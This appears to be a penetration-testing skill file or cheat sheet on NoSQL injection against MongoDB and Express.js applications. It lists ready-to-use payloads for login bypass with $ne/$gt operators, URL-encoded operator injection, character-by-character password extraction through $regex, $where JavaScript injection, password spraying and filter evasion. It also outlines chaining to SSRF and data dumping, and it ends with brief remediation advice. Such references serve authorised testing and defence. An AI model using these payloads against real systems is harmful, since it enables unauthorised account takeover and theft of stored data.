---
name: nosql_injection
description: NoSQL injection for authentication bypass, data extraction, and server-side JS execution
---

# NoSQL Injection

## Attack Surface
- MongoDB query parameters accepting JSON objects from user input (login, search, API)
- Express.js body/query parsers converting `param[$gt]=` into operator objects
- Server-side JavaScript execution via `$where`, `mapReduce`, `$accumulator`

## Detection Techniques
- Inject `{"$gt":""}` or `{"$ne":null}` in username/password fields for auth bypass
- Submit `{"$regex":".*"}` and check if all records return instead of exact match
- Test `$where`: `"$where":"sleep(5000)"` and measure response delay
- URL params: `username[$ne]=x&password[$gt]=` for operator injection via qs parser

## Common Payloads

```
# Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

# URL-encoded operator injection (Express.js)
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*

# Blind boolean extraction via $regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

# $where JavaScript injection
{"$where": "this.username=='admin' && this.password.match(/^a.*/)"}
{"$where": "sleep(5000)"}

# $in operator for password spraying
{"username": "admin", "password": {"$in": ["admin","password","123456"]}}
```

## Bypass Techniques
- URL param pollution: `password[$ne]=x` when JSON injection is filtered
- Unicode-encode operators: `\u0024ne` to bypass pattern filters
- `$regex` for blind extraction when `$ne`/`$gt` are blocked
- Chain: `{"$and":[{"password":{"$ne":""}},{"password":{"$exists":true}}]}`

## Exploit Chaining
- NoSQL + auth bypass: extract admin creds via blind regex, access admin panel
- NoSQL + SSRF: `$where` JS to make HTTP requests to internal services
- NoSQL + data exfil: iterate `$regex` to dump collections char-by-char

## Remediation
- Cast inputs to expected types before query construction (`String(input)`)
- Disable server-side JS: `--noscripting` flag, disable `$where`/`mapReduce`
- Reject objects/arrays in fields expecting scalars; use parameterized queries
